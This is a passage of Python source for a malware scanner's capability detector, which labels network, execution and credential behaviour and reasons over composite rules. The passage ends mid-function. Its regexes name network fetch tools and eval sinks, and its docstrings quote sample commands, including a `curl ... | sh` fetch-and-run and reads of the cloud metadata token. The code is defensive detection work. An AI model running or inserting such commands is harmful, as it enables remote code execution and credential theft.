"""Capability detection and composite reasoning.

This is where the language-agnostic detection model becomes real.

The detector does two distinct jobs, and separating them is the whole design.

**Labelling.** It runs the capability rules over a file's bytes and records what
that file can do: decode, execute, spawn, read credentials, reach the network,
persist. On their own these are observations, not accusations. Every one has
legitimate uses, and reporting them individually would drown a user in noise.

**Reasoning.** It then evaluates composite rules over those labels. A file that
decodes a string *and* executes it is a second-stage loader. A file that reads
credentials *and* reaches the network *and* spawns a process is an exfiltrator.
Neither conclusion is available from any single pattern, which is why signature
matching alone plateaus so quickly.

The reason this generalises across languages is that the primitives are forced
by the attacker's objective rather than chosen by them. To exfiltrate data, code
must read something sensitive and send it somewhere. To run a second stage, it
must decode a payload and execute it. Those constraints hold in every language,
so a new language supplies pattern data for six names and inherits the entire
composite rule set unchanged.
"""

from __future__ import annotations

import ast
import re
from collections import Counter
from collections.abc import Sequence
from contextlib import suppress
from dataclasses import dataclass, replace
from pathlib import PurePosixPath
from typing import TYPE_CHECKING, ClassVar

from cordon_scanner.core.comments import SourceComments
from cordon_scanner.core.models import (
    Capability,
    Category,
    Evidence,
    Explanation,
    Finding,
    Location,
    MatchKind,
    Severity,
)
from cordon_scanner.core.pysyntax import PythonSyntax
from cordon_scanner.core.redact import Redactor
from cordon_scanner.core.samples import SampleKinds
from cordon_scanner.core.scoring import RiskScorer, ScoringContext
from cordon_scanner.detect import embedded
from cordon_scanner.detect.base import (
    BaseDetector,
    DetectorRequirements,
    FileUnit,
    RuleSelector,
    ScanContext,
)
from cordon_scanner.detect.gradle_auth import GradleBuildAuth
from cordon_scanner.detect.nix_code import NixCode
from cordon_scanner.detect.pyast import CREDENTIAL_VARIABLE, PythonSource
from cordon_scanner.detect.secrets import (
    FIXTURE_CEILING,
    RULE_MATERIAL_CEILING,
    SourcePaths,
    SourceSpans,
)

if TYPE_CHECKING:
    from collections.abc import Iterable

    from cordon_scanner.core.content import FileContent
    from cordon_scanner.detect.base import Unit
    from cordon_scanner.detect.embedded import Command
    from cordon_scanner.rules.loader import CompiledRule


MAX_VARIANTS = 8
"""Distinct operations counted per rule before the count stops mattering.

Depth beyond a handful changes no conclusion, and the cap is what keeps a
generated file with a thousand matches from being scanned in full."""

MAX_MATCHES_EXAMINED = 64
"""Occurrences examined per rule while counting distinct operations."""


EGRESS_TARGET = re.compile(
    rb"""(?ix)
    (?:https?|ftp|ws|wss)://          # a destination, written out
    (?:[^\s/@"'`\\]{1,120}@)?        # credentials in the URL, which are not the host
    \[?([A-Za-z0-9._:\-]{1,253})\]?   # the host, bracketed when it is an IPv6 literal
    """,
)
"""A written-out destination in a fetch. Only URLs: a variable cannot be judged."""

SCHEMELESS_TARGET = re.compile(
    rb"""(?ix)
    \b(?:curl|wget)[ \t]{1,8}
    (?:-{1,2}[A-Za-z][A-Za-z0-9-]{0,20}(?:[ \t]{1,8}[^\s-][^\s]{0,40})?[ \t]{1,8}){0,6}
    (                                   # and it has to LOOK like a host:
        (?: localhost
          | [A-Za-z0-9][A-Za-z0-9.-]{0,60}\.[A-Za-z]{2,24}   # a dotted name
          | [0-9]{1,3}(?:\.[0-9]{1,3}){3}                    # an IPv4 literal
        )
        (?::[0-9]{1,5})?
    )
    (?=[/ \t"']|$)
    # Without that the capture took the next token whatever it was, so
    # `curl -X POST localhost:8000/x` yielded `POST` as a second "host", nothing was
    # unanimously local, and the suppression silently stopped applying to exactly the
    # lines it was written for.
    """,
)
"""A fetch whose destination is written without a scheme.

`curl localhost:8000/v1/models` is how a CI script waits for the server it just
started, and vLLM writes it inside a `timeout 600 bash -c "until curl ...; do sleep
1; done"` loop. With only the URL pattern above, no host was found, nothing was
judged local, and the health check counted as reaching the network -- which with
`bash -c` on another line and `.buildkite/` for context produced
`MALWARE.DROPPER.001` at CRITICAL, fifteen times in one repository, about a script
that pulls the project's own image and runs its own test suite in it."""

QUOTED_TARGET = re.compile(
    rb"""(?ix)
    ["'`]
    (?: localhost
      | [0-9]{1,3}(?:\.[0-9]{1,3}){3}
      | ::1
      | [A-Za-z0-9][A-Za-z0-9.-]{0,60}\.[A-Za-z]{2,24}
    )
    (?::[0-9]{1,5})?
    ["'`]
    """,
)
"""A host written as a bare quoted string, with no scheme and no fetch tool in front.

`SCHEMELESS_TARGET` above only reads a `curl` or `wget` line. Every language that opens
a socket directly writes the host on its own: `pnpm` has
`TcpStream::connect(("127.0.0.1", port))` in its benchmark harness, and Go, Python and
Rust all spell it that way.

Adding a source of hosts can only make suppression harder, never easier: `_is_local_target`
requires EVERY host on the line to be local, so a line that quotes a real destination
keeps its capability because of this rather than in spite of it."""

LOCAL_EGRESS_TARGET = re.compile(
    rb"""(?ix)
    ^(?:
        localhost
      | 127\.[0-9.]{1,11}
      | 0\.0\.0\.0
      | ::1
      | 169\.254\.[0-9]{1,3}\.[0-9]{1,3}      # link-local, which every metadata service is
      | metadata\.google\.internal
      | [a-z0-9-]{1,60}\.localhost
    )(?::[0-9]{1,5})?$
    """,
)
"""Destinations that are not the network leaving the machine.

Loopback, and -- the one that prompted this -- the 169.254.0.0/16 link-local
range, which is where every cloud provider puts its instance metadata service.

Deliberately NOT the documentation names. `LOCAL_OR_RESERVED_HOST` in the secret
detector treats `example.com` and the RFC 6761 `.test` family as addresses nobody
authenticates to, which is right for a credential and wrong here: a fetch is a
fetch whatever it resolves to, this project's own malicious corpus is written
against `.test` hosts precisely because they resolve to nothing, and exempting
them would have turned every one of those samples into a false negative. A fetch
written against a documentation host in documentation is already ceilinged by
where it sits.

`stacksimplify/terraform-on-aws-eks` supplied fifteen copies of a fourteen-line
cloud-init script that installs Apache and writes the EC2 instance identity
document into the webroot:

    TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "..."`
    sudo curl -H "X-aws-ec2-metadata-token: $TOKEN" \
        http://169.254.169.254/latest/dynamic/instance-identity/document -o ...

Cordon read that as an outbound connection and produced both
`SUSPECT.PERSIST.001` -- "reaches the network and writes to a location that
survives a restart", the write being `systemctl enable httpd` -- and
`SUSPECT.EXFIL.001`. Neither claim was true: nothing left the instance.

The trade, stated: a payload that reaches a proxy on loopback, or reads metadata
credentials and posts them to 127.0.0.1 for something else to forward, loses this
capability here. That is accepted because the alternative is a capability whose
definition -- "opens an outbound network connection" -- is false for every file
that talks to its own metadata endpoint, and reading IMDS is how a very large
amount of ordinary cloud tooling finds out where it is running. A fetch that does
leave the host is still a fetch: the suppression is per match, so one local curl
beside one remote curl leaves the remote one intact.
"""


class LineRanges:
    """Lines and the ranges that contain them."""

    @staticmethod
    def cls_in(line: int, spans: frozenset[tuple[int, int]]) -> bool:
        """Whether a line falls inside any of these ranges."""
        return any(first <= line <= last for first, last in spans)


@dataclass(frozen=True, slots=True)
class CapabilityHit:
    """One capability observed in a file, with where it was seen."""

    capability: Capability
    rule_id: str
    byte_start: int
    byte_end: int
    line: int
    fixed: bool = False
    """Whether this is a spawn whose entire argv was written out in the source.

    Set only by the Python AST tier, which is the only tier that can answer it.
    See `_evaluate_over`, which is the one place it is read."""

    variants: int = 1
    """How many distinct operations of this capability the rule matched.

    A decode rule covering base64, hex and decompression matches all three
    with one pattern, so the number of rules that fired cannot express how many
    decoding steps a file performs. This can: one call site repeated ten times
    is still one operation, and base64 followed by decompression is two."""

    resolved: bool = False
    """Whether this hit came from parsing the source rather than scanning it.

    A parsed hit is a SECOND VIEW of a call the byte tier usually saw too --
    `base64.b64decode(blob)` is one decoding step whether one tier reports it or
    three do. So these are excluded from the depth counts in `_evaluate_over`,
    or every parsed Python file would appear to decode twice and satisfy rules
    that ask for a chain of encodings.

    This used to be inferred from the rule id beginning `AST.`, which held only
    while the single internal tier was the only thing producing such hits.
    Adding `kind: ast` to the rule vocabulary broke that silently: rules named
    `CAP.PY.AST.*` are the same second view, do not begin with `AST.`, and so
    were counted -- which turned one `base64.b64decode` into a two-step decode
    chain and fired `SUSPECT.DECODE_CHAIN.001` on a file that decodes once.
    Carried explicitly now, because the property is about where a hit came from
    and never was about how it was named."""


class ScriptFetchedThenEvaluated:
    """Ruby and PHP: a variable read from the network, later handed to an evaluator.

    `body = URI.open(url).read` then `eval(body)`; `$code = file_get_contents("https://...")` then
    `eval($code)`. Two statements, so the one-construct fetch-and-execute patterns do not see it and
    the dropper composite, which deliberately refuses to pair any egress with any eval, stays quiet --
    but here the thing evaluated IS the thing fetched, which is the whole of what that composite asks.
    One hop, by name, within the file: the binding is what makes it evidence, and an eval of some
    other variable in a file that also makes a request is the ordinary case the composite excludes.
    Recorded as `fetch_exec` at the evaluation, so the composites judge it with the context they use.
    """

    RULE_ID = "CAP.SCRIPT.FETCHED_THEN_EVALUATED"
    WINDOW = 4000

    RUBY_SOURCE = re.compile(
        r"(?m)^[ \t]{0,40}([a-z_][A-Za-z0-9_]{0,40})[ \t]{0,4}=[ \t]{0,4}"
        r"(?:URI[ \t]{0,4}\.[ \t]{0,4}open|URI[ \t]{0,4}\.[ \t]{0,4}parse\([^)\n]{0,200}\)[ \t]{0,4}\.[ \t]{0,4}read"
        r"|Net::HTTP[ \t]{0,4}\.[ \t]{0,4}get(?:_response)?|open[ \t]{0,4}\([ \t]{0,4}[\"']https?://"
        r"|(?:HTTParty|Faraday|RestClient)[ \t]{0,4}\.[ \t]{0,4}get)\b"
    )
    RUBY_SINK = r"\b(?:Kernel[ \t]{{0,4}}\.[ \t]{{0,4}})?(?:eval|instance_eval|class_eval|module_eval)[ \t]{{0,4}}\(?[ \t]{{0,4}}{name}\b"
    PHP_SOURCE = re.compile(
        r"\$([A-Za-z_][A-Za-z0-9_]{0,40})[ \t]{0,4}=[ \t]{0,4}"
        r"(?:@[ \t]{0,4})?(?:file_get_contents[ \t]{0,4}\([ \t]{0,4}[\"']https?://|curl_exec[ \t]{0,4}\()"
    )
    PHP_SINK = r"\b(?:eval|assert|create_function|system|exec|shell_exec|passthru|popen|proc_open)[ \t]{{0,4}}\([ \t]{{0,4}}\${name}\b"

    @classmethod
    def hits(cls, content: FileContent, language: str | None) -> list[CapabilityHit]:
        if language == "ruby":
            source, sink = cls.RUBY_SOURCE, cls.RUBY_SINK
        elif language == "php":
            source, sink = cls.PHP_SOURCE, cls.PHP_SINK
        else:
            return []
        text = content.text
        for bound in source.finditer(text):
            name = re.escape(bound.group(1))
            window = text[bound.end() : bound.end() + cls.WINDOW]
            evaluated = re.search(sink.format(name=name), window)
            if evaluated is None:
                continue
            offset = bound.end() + evaluated.start()
            start = len(text[:offset].encode("utf-8"))
            return [
                CapabilityHit(
                    capability=Capability.FETCH_EXEC,
                    rule_id=cls.RULE_ID,
                    byte_start=start,
                    byte_end=start + len(evaluated.group(0).encode("utf-8")),
                    line=text.count("\n", 0, offset) + 1,
                )
            ]
        return []


class CapabilityDetector(BaseDetector):
    """Labels files with capabilities and evaluates composite rules over them."""

    id = "capability"
    # 0.2.0: a spawn whose whole argv is written out no longer satisfies a composite,
    # a capability named in a comment is not a capability, a link-local destination is
    # not egress, and a provisioning script's persistence is ceilinged. The bump is
    # what invalidates a cached result: `ScanCache.detector_signature` is `id@version`
    # and nothing else notices that a detector's behaviour changed.
    # 0.10.0: a presence test on one environment name is not whole-environment
    # access, and a primitive that is called is recorded once rather than twice.
    # 0.11.0: where the pattern tier and the AST tier label the same call differently,
    # the pattern tier wins -- one call is not two of a composite's capabilities.
    # 0.12.0: an encoded command's plaintext reaches the rules, and the
    # minified ceiling no longer excuses a language nobody minifies.
    version = "0.12.0"
    categories = frozenset(
        {Category.SUSPICIOUS, Category.MALICIOUS, Category.POLICY, Category.OPERATIONAL}
    )
    requires = DetectorRequirements(content=True)

    def applicable(self, ctx: ScanContext) -> bool:
        """Runs whenever any capability or composite rule is loaded."""
        return any(
            r.rule.capability is not None or r.match.kind is MatchKind.COMPOSITE for r in ctx.rules
        )

    def inspect(self, unit: Unit, ctx: ScanContext) -> Iterable[Finding]:
        if not isinstance(unit, FileUnit):
            return ()

        content = unit.content

        # Binary files are excluded from content rules. A byte sequence in a PNG
        # that happens to spell a pattern is a false positive with no upside,
        # and the file was never source to begin with.
        if content.is_binary:
            return ()

        candidates = RuleSelector.select_rules(ctx.rules, language=unit.language, path=content.path)
        if not candidates:
            return ()

        hits = self._match_capabilities(content, candidates, unit.language)
        hits.extend(self._folded_capabilities(content, candidates, unit.language, hits))
        resolved, commands = self._resolved_capabilities(unit, content, ctx)
        if not commands and unit.language != "python":
            commands = embedded.EmbeddedCommands.extract(content.text, unit.language)
        # And the plaintext of any encoded command among them, so the shell rules
        # see what `powershell -EncodedCommand` was given rather than only that it
        # was given something. See `embedded.decode_encoded_commands`: this is the
        # seam that made 109 of 171 missed malicious packages invisible.
        if NixCode.is_nix(content.path):
            # A Nix file's shell is in its strings: a service's `script`, a build phase, an
            # activation. Read as shell, as a spawned command line is (`detect/nix_code.py`).
            commands.extend(
                embedded.Command(text, line) for text, line in NixCode.shell(content.text)
            )
        commands = embedded.EmbeddedCommands.decode_encoded_commands(commands)
        # And the plaintext of an encoded command the script runs at its own top
        # level, which is handed to no call and so reaches neither branch above.
        if unit.language in embedded.SCRIPT_LANGUAGES:
            commands.extend(embedded.EmbeddedCommands.encoded_commands_in(content.text))
        hits.extend(resolved)
        hits.extend(self._ast_rule_capabilities(content, candidates, unit.language))
        if unit.language == "python" and any(
            h.capability
            in (Capability.EXECUTE, Capability.CREDENTIAL, Capability.DECODE, Capability.PERSIST)
            or h.rule_id == "CAP.EGRESS.DNS_CONSTRUCTED.001"
            for h in hits
        ):
            hits = self._drop_excused_pattern_hits(content, hits)
        if GradleBuildAuth.is_build_script(content.path) and any(
            h.capability is Capability.CREDENTIAL for h in hits
        ):
            # A build's own signing passwords and publishing tokens (`detect/gradle_auth.py`).
            hits = GradleBuildAuth.drop_build_auth(content.text, hits, Capability.CREDENTIAL)
        hits.extend(self._embedded_capabilities(ctx, content, commands))
        hits.extend(self._destination_capabilities(content, unit.language))
        hits.extend(self._js_downloaded_and_run(content, unit.language))
        hits.extend(self._js_wallet_secret_sent(content, unit.language))
        hits.extend(self._js_flows(content, unit.language))
        computed = self._js_computed_require(content, unit.language)
        hits.extend(computed)
        if computed and not self._bundled(content):
            # The same, in a hand-written file: the install-time composite may convict on this alone.
            # A bundle's loader computes module names by construction (review 98: two extensions'
            # dist/extension.js).
            first = computed[0]
            hits.append(replace(first, rule_id="CAP.JS.COMPUTED_REQUIRE_SOURCE"))
        hits.extend(self._js_spelled_names(content, unit.language))
        hits.extend(ScriptFetchedThenEvaluated.hits(content, unit.language))
        # A truncated file is reported by the engine, which reads every file and so sees every
        # truncation; this detector returns early for some.
        # The rest of an oversized file is read by the engine, in windows, with every rule here
        # and the other text detectors (`core/windows.py`), on the serial path and in the pool.
        if NixCode.is_nix(content.path):
            # What a Nix file declares does not run (`detect/nix_code.py`).
            hits = NixCode.keep_running(content.text, hits)
        hits = self._off_this_machine(content, hits)
        if self._bundled(content):
            # A compiled tool that schedules its own jobs (an agent runner's LaunchAgent, a
            # crontab writer) registers autostart entries as its feature; three Open VSX agent
            # extensions do it from dist/. The hand-written file is where an implant's is
            # (review 98).
            hits = [h for h in hits if h.rule_id != "CAP.JS.AUTOSTART.001"]
        return list(self._composite_findings(unit, ctx, hits, candidates))

    #: A call on an SSH session that takes a command: what it is given runs elsewhere.
    _REMOTE_CALL: ClassVar[re.Pattern[bytes]] = re.compile(
        rb"(?i)(?<![\w$])(?:ssh|sftp)[\w$]{0,24}\s{0,4}\.\s{0,4}"
        rb"(?:exec|execCommand|exec_command|run|shell|spawn)\s{0,4}\("
    )
    _REMOTE_SPAN_MAX: ClassVar[int] = 200_000

    def _off_this_machine(
        self, content: FileContent, hits: list[CapabilityHit]
    ) -> list[CapabilityHit]:
        """Drop hits inside the arguments of a command sent to an SSH session.

        A deployment tool provisions a server by sending it a script -- install a runtime with
        `curl | bash`, write a systemd unit, enable it -- and every line of that script describes
        the other machine. Read as this file's own behaviour it is a dropper with persistence
        (review 98: a deployment library's server bootstrap). Not when the file binds the session's
        name to `child_process`: see `EmbeddedCommands.remote_session`.
        """
        raw = content.raw
        if not hits or not self._REMOTE_CALL.search(raw):
            return hits
        spans: list[tuple[int, int]] = []
        for call in self._REMOTE_CALL.finditer(raw):
            name = re.match(rb"[\w$]+", raw[call.start() : call.end()])
            if not name or not embedded.EmbeddedCommands.remote_session(
                content.text, name.group(0).decode("ascii", "replace")
            ):
                continue
            depth, j, end = 1, call.end(), min(len(raw), call.end() + self._REMOTE_SPAN_MAX)
            while j < end and depth:
                c = raw[j]
                if c == 0x28:
                    depth += 1
                elif c == 0x29:
                    depth -= 1
                j += 1
            spans.append((call.start(), j))
        if not spans:
            return hits
        return [h for h in hits if not any(a <= h.byte_start < b for a, b in spans)]

    # -- Labelling -------------------------------------------------------

    TOOL_PROBE = re.compile(
        rb"""(?ix)
        (?:
            # Asking whether the tool exists.
            (?:
                \b(?:which|type|hash|whence|where)[ \t]{1,4}
              | \bcommand[ \t]{1,4}-v[ \t]{1,4}
              | \bcompgen[ \t]{1,4}-c[ \t]{1,4}
            )
            (?:-{1,2}[A-Za-z-]{1,12}[ \t]{1,4}){0,2}
          | # Or naming it as a package to install, where it is a noun rather than a verb:
            # `apt-get install -y wget curl` is how a script ACQUIRES curl.
            \b(?:apt|apt-get|aptitude|yum|dnf|microdnf|zypper|apk|brew|pacman|choco)\b
            [^\n]{0,40}?\b(?:install|add|-S)\b[ \t]{1,4}
            (?:[-\w.=]{1,40}[ \t]{1,4}){0,8}
        )
        $
        """,
    )
    """Asking whether a tool exists, which is not using it.

    vLLM's `run-benchmarks.sh` opens with
    `(which wget && which curl) || (apt-get update && apt-get install -y wget curl)`,
    and the egress primitive matched the word `curl`. With `bash -c` on another line
    that was `MALWARE.DROPPER.001` at CRITICAL, and pm2's `setup.deb.sh` does the same
    thing with `if command -v curl > /dev/null`.

    Anchored at the end, so it is the text immediately before the match that decides:
    `which curl` is a probe and `curl https://x/y` one line later is still a fetch."""

    FETCH_COMMAND = re.compile(rb"(?i)\b(?:curl|wget|nc|scp|rsync|Invoke-WebRequest)\b")
    """The commands an egress pattern is looking for, so their position can be found.

    The shell egress patterns are anchored at the start of the line, with a
    comment-excluding prefix before the command name, which means the MATCH begins at
    the line start and says nothing about what sits
    immediately before the command. Rather than rewrite six patterns in the pack and
    lose their own comment guard, the commands are located again here."""

    DECLARATION = re.compile(
        rb"""(?ix)
        (?:
            \b(?:function|def|fn|sub|proc|method|interface|declare|class|impl)
            [ \t]{1,8}(?:\*[ \t]{0,4})?
            # `use` brings a name into scope and calls nothing. `zeroclaw` writes
            # `use reqwest::Client;`, `pnpm` writes `use reqwest::Url;`, and both were
            # reported as opening an outbound connection -- three findings across two
            # repositories whose whole content was an import line.
          | \buse[ \t]{1,8}
            # And whatever path sits between `use` and the name. The match is often the
            # LAST segment -- `use std::process::Command;` -- where everything before it
            # is the path rather than whitespace after the keyword.
            (?:[A-Za-z_][A-Za-z0-9_]{0,40}(?:::|\.)){0,8}
          | \b(?:async|export|public|private|protected|static|abstract|override)
            [ \t]{1,8}(?:function[ \t]{1,8})?
        )
        $
        """,
    )
    """The keywords that make what follows a definition rather than a call.

    `google/zx` exports a function called `fetch`, and the egress pattern matched it:
    `export function fetch(` was that repository's only blocking finding. Defining a
    name is not using the thing it is named after."""

    SIGNATURE_ARGUMENT = re.compile(
        rb"""(?x)
        \([ \t]{0,8}
        (?:
            [A-Za-z_$][\w$]{0,40}[ \t]{0,4}\?{0,1}[ \t]{0,4}:[ \t]{0,4}[A-Za-z_$\[(]
          | \)[ \t]{0,4}:[ \t]{0,4}[A-Za-z_$]
        )
        """,
    )
    """A typed parameter list, which only a declaration has.

    Tailwind's integration helpers declare
    `exec(command: string, options?: ChildProcessOptions): Promise<string>` on an
    interface. A call passes values; `name: Type` in the parentheses is a signature, and
    so is an empty list followed by a return type."""

    OPEN_PAREN_ONLY = re.compile(rb"^\([ \t]*(?://.*)?$")
    """An opening parenthesis that ends its line, so the parameters are below it."""

    CONTINUED_PARAMETER = re.compile(
        rb"""(?x)
        ^[ \t]{0,40}
        (?:(?:readonly|public|private|protected)[ \t]{1,8}){0,2}
        [A-Za-z_$][\w$]{0,40}[ \t]{0,4}\?{0,1}[ \t]{0,4}:[ \t]{0,4}[A-Za-z_$\[({]
        """,
    )
    """`name: Type` opening a line: a parameter in a signature laid out one to a line."""

    SIGNATURE_LOOKAHEAD = 3
    """How many lines below an open parenthesis to look for a typed parameter.

    Three. A signature that has not named a typed parameter within three lines of
    its parenthesis is not being recognised from its first line either."""

    @staticmethod
    def _is_declaration(content: FileContent, offset: int, end: int) -> bool:
        """Whether this match is a name being DEFINED rather than called."""
        line_number = content.line_of(offset)
        line = content.line_text(line_number).encode("utf-8", errors="replace")
        column = content.column_of(offset) - 1
        if CapabilityDetector.DECLARATION.search(line[:column]) is not None:
            return True
        # From the match's LAST byte, which for these patterns is the opening
        # parenthesis -- `exec(` -- and the signature test needs to see it.
        tail = line[content.column_of(max(offset, end - 1)) - 1 :]
        if CapabilityDetector.SIGNATURE_ARGUMENT.match(tail) is not None:
            return True

        # A signature laid out one parameter to a line. The test above reads the
        # rest of THIS line, so a declaration whose parentheses open at the end of
        # it was invisible:
        #
        #     fetch(
        #         url: string,
        #         secretKey: string,
        #
        # That is `microsoft/vscode`, in the Copilot extension's
        # `ICompletionsFetchService` interface. `fetch(` was read as a network call
        # and `secretKey` as key material, and together they reported private key
        # material sent to the network at CRITICAL -- against a method signature,
        # twice, in the most widely installed editor there is.
        #
        # The defect is general rather than new: `exec(` opening a multi-line
        # signature was never suppressed either.
        if CapabilityDetector.OPEN_PAREN_ONLY.match(tail.strip()) is None:
            return False
        last = len(content.line_starts)
        stop = min(line_number + 1 + CapabilityDetector.SIGNATURE_LOOKAHEAD, last + 1)
        for ahead in range(line_number + 1, stop):
            nxt = content.line_text(ahead).encode("utf-8", errors="replace").strip()
            if not nxt:
                continue
            return CapabilityDetector.CONTINUED_PARAMETER.match(nxt) is not None
        return False

    @staticmethod
    def _is_tool_probe(content: FileContent, offset: int) -> bool:
        """Whether every fetch command on this line is the argument of an existence test.

        `(which wget && which curl) || (apt-get install -y wget curl)` is the first line
        of vLLM's benchmark script, and pm2's installer writes
        `if command -v curl > /dev/null`. Asking whether a tool exists is not using it.

        EVERY occurrence has to be a probe, so `which curl && curl https://x/y | sh` --
        a probe and then the real thing on one line -- is not excused.
        """
        line = content.line_text(content.line_of(offset)).encode("utf-8", errors="replace")
        commands = list(CapabilityDetector.FETCH_COMMAND.finditer(line))
        if not commands:
            return False
        return all(
            CapabilityDetector.TOOL_PROBE.search(line[: command.start()]) is not None
            for command in commands
        )

    @staticmethod
    def _is_local_target(content: FileContent, offset: int) -> bool:
        """Whether every destination written beside this fetch stays on the machine.

        Judged from the line the match sits on, and from a written-out URL only: a
        fetch of `"$URL"` says nothing about where it goes, and a line naming no host
        at all is left alone. Suppression requires EVERY host on the line to be local,
        so a command that reads metadata and pipes it somewhere real keeps its
        capability.
        """
        line = content.line_text(content.line_of(offset)).encode("utf-8", errors="replace")
        hosts = (
            EGRESS_TARGET.findall(line)
            + SCHEMELESS_TARGET.findall(line)
            # And hosts written as a bare quoted string. See `QUOTED_TARGET`.
            + [found.strip(b"\"'`") for found in QUOTED_TARGET.findall(line)]
        )
        # Trimmed, because a URL is often assembled out of shell quoting:
        # `"http://127.0.0.1:'"$port"'/health"` leaves the capture as `127.0.0.1:` with
        # the port on the other side of a quote, and an incomplete port is not a reason
        # to call a loopback address remote. vLLM writes that line in every integration
        # script it has.
        # From the RIGHT only. `::1` is a loopback address whose leading colons are the
        # address, and stripping both ends turned it into `1`, which the suite caught.
        trimmed = [host.rstrip(b":.'\"") for host in hosts]
        return bool(trimmed) and all(LOCAL_EGRESS_TARGET.match(host) for host in trimmed)

    _JS_EVAL_MAX_BYTES: ClassVar[int] = 100_000
    #: What a file that computes its names contains; without one, there is nothing to evaluate.
    _JS_EVAL_MARKERS: ClassVar[re.Pattern[str]] = re.compile(
        r"fromCharCode|Buffer\s*\.\s*from\s*\(|\batob\s*\(|\.\s*concat\s*\(|=\s*require\s*[;,\n]"
        r"|constructor\s*\.\s*_load|\\x[0-9a-fA-F]{2}|\[\s*\d{2,3}\s*,\s*\d{2,3}\s*,"
        r"|\bdns\s*\.\s*(?:promises\s*\.\s*)?(?:lookup|resolve)"
    )

    def _folded_capabilities(
        self,
        content: FileContent,
        candidates: tuple[CompiledRule, ...],
        language: str | None,
        seen: list[CapabilityHit],
    ) -> list[CapabilityHit]:
        """Capabilities that appear only once split string fragments are joined (`js_fold`).

        Placed on the original line, which the fold keeps, and spanning it, since the joined text
        is not in the file byte for byte.
        """
        if language not in ("javascript", "typescript"):
            return []
        from cordon_scanner.core.content import FileContent
        from cordon_scanner.detect.js_eval import JsEval
        from cordon_scanner.detect.js_fold import JsFold

        text = content.text
        folded = JsFold.fold(text) if "+" in text and JsFold.has_fragments(text) else text
        # And the names and strings the file computes from constants (`detect/js_eval.py`):
        # decoders of character codes, hex and base64, `.concat` chains, `require` under an alias.
        decoded_lines: list[int] = []
        # Hand-written loaders are small; a bundle reuses its short names across scopes, and a
        # constant bound "once" there is a different variable in each function (review 98: a
        # BigQuery extension's 480-line bundle).
        if (
            len(text) <= self._JS_EVAL_MAX_BYTES
            and self._JS_EVAL_MARKERS.search(text)
            and not self._bundled(content)
        ):
            try:
                folded, decoded_lines = JsEval.resolve_with_decodes(folded)
            except (IndexError, KeyError, ValueError, TypeError, RecursionError):
                # The evaluator reads hostile, malformed and unusual code. If it ever trips on a
                # file, the file is read as written -- every other rule still applies -- rather
                # than the scan failing.
                decoded_lines = []
        elif len(text) <= self._JS_EVAL_MAX_BYTES and not self._bundled(content):
            # Without anything to evaluate, still the modules under names chosen to look like
            # anything else (`JsEval.module_names`), which the evaluator's view also writes back.
            folded = JsEval.module_names(folded)
        if folded == text:
            return []
        already = {(h.rule_id, h.line) for h in seen}
        starts = [0]
        raw = text.encode("utf-8")
        for index, byte in enumerate(raw):
            if byte == 0x0A:
                starts.append(index + 1)
        extra: list[CapabilityHit] = []
        view = FileContent.from_bytes(content.path, folded.encode("utf-8"))
        for hit in self._match_capabilities(view, candidates, language):
            if (hit.rule_id, hit.line) in already or hit.line > len(starts):
                continue
            begin = starts[hit.line - 1]
            end = starts[hit.line] - 1 if hit.line < len(starts) else len(raw)
            extra.append(
                CapabilityHit(
                    capability=hit.capability,
                    rule_id=hit.rule_id,
                    byte_start=begin,
                    byte_end=max(begin, end),
                    line=hit.line,
                )
            )
        # The evaluation itself is the decode: `Buffer.from(hex, "hex").toString()` written out as
        # the command it held leaves no decoder in the view for the decode rules to see.
        for line in decoded_lines:
            if line > len(starts):
                continue
            begin = starts[line - 1]
            end = starts[line] - 1 if line < len(starts) else len(raw)
            extra.append(
                CapabilityHit(
                    capability=Capability.DECODE,
                    rule_id="CAP.JS.EVALUATED_DECODE",
                    byte_start=begin,
                    byte_end=max(begin, end),
                    line=line,
                )
            )
        return extra

    def _match_capabilities(
        self,
        content: FileContent,
        candidates: tuple[CompiledRule, ...],
        language: str | None = None,
    ) -> list[CapabilityHit]:
        """Run capability rules over the file's bytes.

        Matching happens against ``bytes``, never decoded text. Most files match
        nothing, and decoding them all would be the single largest waste in the
        scan. It also means attacker-controlled bytes are only decoded once
        something has already indicated it is worth doing.
        """
        raw = content.raw
        hits: list[CapabilityHit] = []
        # Once per file, not once per match: the per-line comment test cannot see a
        # `/* ... */` whose continuation lines are indented prose rather than starting
        # with `*`. See `core.comments.block_comment_spans`.
        blocks = SourceComments.block_comment_spans(content.text, language)
        # And the Rust test modules, for the same reason and on the same schedule. A
        # `#[cfg(test)]` block is live code, so none of the comment tests above sees it,
        # and it is where a Rust crate's sample credentials and sample hosts live.
        # `Hmbown/Codewhale` builds a fleet-host fixture in one, with an SSH identity
        # path and a chat webhook in the same module, and the pair was reported as
        # credential access beside a drop point.
        #
        # Only for Rust. Every other language keeps its tests in a separate file, which
        # the path globs already answer.
        tests = SourceSpans.test_module_spans(content.text) if language == "rust" else ()
        # And Python's docstrings, which are prose in a string and so invisible to every
        # comment test above. `NousResearch/hermes-agent` opens
        # `gateway/shutdown_forensics.py` with a summary of what it collects -- "/proc
        # summaries, systemd parentage, takeover markers, TracerPid, 1-min load" -- and
        # `TracerPid` in that sentence was reported as code checking whether it is being
        # traced. The file is named for reading those things; the docstring says so.
        #
        # The secrets detector has parsed these since it measured them. The same parse,
        # the same cache-once-per-file schedule.
        prose = SourceSpans.documentation_spans(content.text) if language == "python" else ()
        # And the lines where a sleep sits inside a loop, which is a heartbeat rather
        # than a delay before a payload. `CAP.ANTI.DELAY.001` records in its own comment
        # that this belongs in the Python tier and not in a pattern; see
        # `pyast.loop_delay_lines`.
        delays = (
            PythonSource.loop_delay_lines(content.text) if language == "python" else frozenset()
        )

        # Lower-cased once per file, and only if some candidate's prefilter is case-folded.
        folded = (
            raw.lower()
            if any(
                (c.match.prefilter_folded and not c.match.prefilter) or c.match.folds
                for c in candidates
            )
            else None
        )

        for compiled in candidates:
            capability = compiled.rule.capability
            if capability is None or compiled.match.regex is None:
                continue

            # The prefilter is what makes this affordable. A cheap substring scan
            # rejects the large majority of files before any regex runs, turning
            # cost proportional to files times rules into something a commit-time
            # hook can pay.
            regex = compiled.match.regex_for(raw, folded)
            if regex is None:
                continue

            first = None
            distinct: set[bytes] = set()

            for index, match in enumerate(regex.finditer(raw)):
                if CapabilityDetector._is_printed_text(content, match.start(), match.end()):
                    continue
                if (
                    capability is Capability.FETCH_EXEC
                    and compiled.rule.id not in CapabilityDetector.QUOTED_BY_DESIGN
                    and CapabilityDetector._is_quoted_pipeline(content, match.start(), match.end())
                ):
